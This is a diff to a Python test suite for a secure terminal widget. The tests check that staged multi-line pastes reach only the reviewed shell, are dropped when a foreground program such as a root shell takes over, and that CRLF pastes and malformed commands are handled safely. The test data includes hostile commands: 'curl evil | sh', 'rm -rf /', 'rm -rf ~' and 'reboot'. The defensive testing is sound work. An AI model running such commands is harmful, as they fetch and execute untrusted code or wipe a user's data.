@@ -2900,38 +2900,83 @@ eq(_hsent, [b'echo one'],
 eq(cw._staged_paste, ['curl evil | sh'],
    'the remaining command is STAGED, not written')
 ok(cw._line_dirty, 'the delivered first line marks the prompt unverifiable')
-# the user reads line 1 and presses Enter: it submits, and ONLY THEN is line 2 fed to
-# the fresh prompt -- still un-submitted, awaiting the user's next Enter.
+# the user reads line 1 and presses Enter: it submits and ARMS the next line, but does
+# NOT write it here -- the feed is deferred to the next read that confirms the reviewed
+# shell (no fg program). CANARY: the earlier synchronous feed wrote the staged line on
+# THIS keypress, before the shell could fork a program line 1 launched.
 _hsent.clear()
 key(cw, Qt.Key.Key_Return)
+eq(_hsent, [b'\r'], "the Enter submits line 1 and does NOT write the staged line here")
+ok(cw._stage_feed_pending, 'the next staged line is ARMED, pending a safe read')
+# the next read, back at the shell (no fg program), feeds line 2 -- still un-submitted.
+feed_output(cw, b'$ ')                               # a prompt read: back at the shell
 eq(_hsent, [b'\r', b'curl evil | sh'],
-   "the user's Enter submits line 1, THEN the staged line 2 is fed (still not submitted)")
+   'the staged line 2 is fed only once a read confirms the reviewed shell, awaiting Enter')
 eq(cw._staged_paste, [], 'the stage drains once the last line is fed')
-# a final Enter submits line 2; nothing remains to feed.
+ok(not cw._stage_feed_pending, 'the armed flag clears after the feed')
+# a final Enter submits line 2; nothing remains, so nothing is armed or fed.
 _hsent.clear()
 key(cw, Qt.Key.Key_Return)
 eq(_hsent, [b'\r'], 'the last Enter submits line 2 with nothing left to feed')
+ok(not cw._stage_feed_pending, 'submitting the final line arms nothing')
 
-# Ctrl+M / Ctrl+J accept-line advance a staged paste exactly like Enter.
+# SECURITY (reviewdrain16 #1): if the reviewed FIRST line launches a program/shell
+# (sudo -i, ssh, a pager), the staged line must NOT be delivered into THAT context --
+# only into the reviewed shell. Because the feed is deferred to a read, a read that
+# finds a FOREGROUND PROGRAM drops the stage instead of feeding it. CANARY: the
+# synchronous feed wrote the staged line on the keypress, before the program forked, so
+# it reached e.g. a root shell as a live command.
+_redir = SecureTerminal(command='/bin/cat')
+_rsent = spy_writes(_redir)
+_redir._staged_paste = ['rm -rf /']                  # the dangerous staged line
+_redir._stage_feed_pending = True                    # armed by the Enter that ran line 1
+_redir._bracket_had_fg = False
+_redir.has_foreground_program = lambda: True         # line 1 (sudo -i) now owns the tty
+feed_output(_redir, b'root@host:~# ')                # first read after the redirect
+eq(_rsent, [], 'the staged line is NEVER fed into a program the first line launched')
+eq(_redir._staged_paste, [], 'the stage is dropped once a foreground program is seen')
+ok(not _redir._stage_feed_pending, 'and the armed feed is disarmed')
+_redir.close()
+
+# Ctrl+M / Ctrl+J accept-line advance a staged paste exactly like Enter: arm, not feed.
 cw._staged_paste = ['two', 'three']
+cw._stage_feed_pending = False
 _hsent.clear()
 key(cw, Qt.Key.Key_M, mods=_ctrl_mod)                # accept-line == submit
-eq(_hsent, [b'\r', b'two'], 'Ctrl+M submits then feeds the next staged line')
-eq(cw._staged_paste, ['three'], 'one staged line consumed by the accept-line')
+eq(_hsent, [b'\r'], 'Ctrl+M submits (the staged line is armed, not written here)')
+ok(cw._stage_feed_pending, 'accept-line arms the next staged line')
+feed_output(cw, b'$ ')                               # safe read feeds it
+eq(_hsent, [b'\r', b'two'], 'the next staged line is fed on the safe read')
+eq(cw._staged_paste, ['three'], 'one staged line consumed')
+cw._staged_paste = []
+cw._stage_feed_pending = False
 
-# Ctrl+C (SIGINT) ABANDONS a staged paste -- the remainder is dropped, never fed.
+# Ctrl+C (SIGINT) ABANDONS a staged paste -- the remainder is dropped AND disarmed.
 cw._staged_paste = ['rm -rf ~', 'reboot']
+cw._stage_feed_pending = True
 _hsent.clear()
 key(cw, Qt.Key.Key_C, mods=_ctrl_mod)
 eq(cw._staged_paste, [], 'Ctrl+C abandons the staged-paste remainder')
+ok(not cw._stage_feed_pending, 'Ctrl+C also disarms a pending feed')
 
 # an empty staged line (a blank line in the paste) writes nothing but is consumed, so
-# the user's Enter that submitted it still advances to the next command.
+# the read that feeds it still advances to the next command.
 cw._staged_paste = ['', 'echo done']
+cw._stage_feed_pending = True
 _hsent.clear()
-key(cw, Qt.Key.Key_Return)
-eq(_hsent, [b'\r'], 'submitting an empty staged line feeds no bytes')
+feed_output(cw, b'$ ')                               # safe read consumes the blank line
+eq(_hsent, [], 'feeding an empty staged line writes no bytes')
 eq(cw._staged_paste, ['echo done'], 'but the blank line is consumed, next line pending')
+cw._staged_paste = []
+cw._stage_feed_pending = False
+
+# _feed_staged_paste is defensively crash-safe with nothing staged: the arming
+# invariant (pending is set only for a non-empty stage, and every clear-path clears
+# both) means callers never reach it that way, but the guard avoids a pop() on empty.
+_hsent.clear()
+cw._staged_paste = []
+cw._feed_staged_paste()
+eq(_hsent, [], '_feed_staged_paste on an empty stage writes nothing (no IndexError)')
 
 # a foreground program taking the tty DROPS a CLI-staged paste: the stage belonged to
 # the shell prompt it was pasted at, not to the program. Exiting the program and
@@ -2943,6 +2988,40 @@ _stg._staged_paste = ['stale line']
 feed_output(_stg, b'program output')                  # a read observes the fg edge
 eq(_stg._staged_paste, [], 'a foreground program starting drops a CLI-staged paste')
 _stg.close()
+
+# CRLF is ONE line break: a Windows-clipboard multi-line paste must NOT stage a
+# spurious empty line between the two commands. sanitize_paste maps every newline to
+# a submit CR; without collapsing CRLF first, "\r\n" became "\r\r" -> an empty staged
+# element the user had to Enter past.
+cw.apply_paste_warn('unicode')
+cw._line_buffer = ''
+cw._line_dirty = False
+cw._staged_paste = []
+_hsent.clear()
+_pmcrlf = _QMimePaste()
+_pmcrlf.setText('echo 1\r\necho 2')                  # CRLF between the two commands
+cw.insertFromMimeData(_pmcrlf)
+ok(cw.review_pending(), 'the CRLF multi-line paste is held for review')
+cw.dispatch_pending_paste('stripped')
+eq(_hsent, [b'echo 1'], 'a CRLF paste delivers the first line, no spurious empty line')
+eq(cw._staged_paste, ['echo 2'],
+   'CRLF collapses to one break -- no empty staged element between the commands')
+cw._staged_paste = []
+cw._line_dirty = False
+
+# _argv_for_command: a MALFORMED command string (unbalanced quote) must NOT raise --
+# raised in the pty.fork child it prints an uncaught traceback the parent masks as a
+# normal exit. It yields [] instead, so _start falls back to the login shell.
+from secure_terminal.terminal import _argv_for_command as _argv   # noqa: E402
+eq(_argv(['ssh', '-p', '22', 'host']), ['ssh', '-p', '22', 'host'],
+   'a list command is used verbatim as argv')
+eq(_argv('ssh -p 22 host'), ['ssh', '-p', '22', 'host'],
+   'a string command is split like a shell word list')
+eq(_argv(''), [], 'an empty command yields [] (caller substitutes the login shell)')
+eq(_argv(None), [], 'no command yields []')
+eq(_argv('echo "unbalanced'), [],
+   'a malformed command (unbalanced quote) yields [] instead of raising ValueError')
+
 _hsent.clear()
 cw.apply_paste_warn('unicode')
 
